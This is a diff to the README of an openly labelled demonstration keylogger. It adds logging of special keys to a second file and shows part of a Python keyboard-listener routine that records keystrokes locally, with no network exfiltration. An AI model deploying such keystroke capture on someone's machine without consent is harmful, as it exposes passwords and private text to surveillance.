@@ -42,7 +42,7 @@ This project demonstrates a basic keylogger program that records and logs keystr
     python keylogger.py
     ```
 
-2. The script will start logging keystrokes and save them to `keylog.txt`.
+2. The script will start logging keystrokes and save them to `keylog.txt` and special keys will store to `special_keylog.txt`.
 
 ## Code Overview
 
@@ -55,8 +55,9 @@ def keyPressed(key):
         try:
             char = key.char
             logkey.write(char)
-        except:
-            print("Error getting char")
+        except AttributeError:
+            with open("special_keylog.txt", 'a') as special_key:
+                special_key.write('Special key {0} pressed, '.format(key))
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
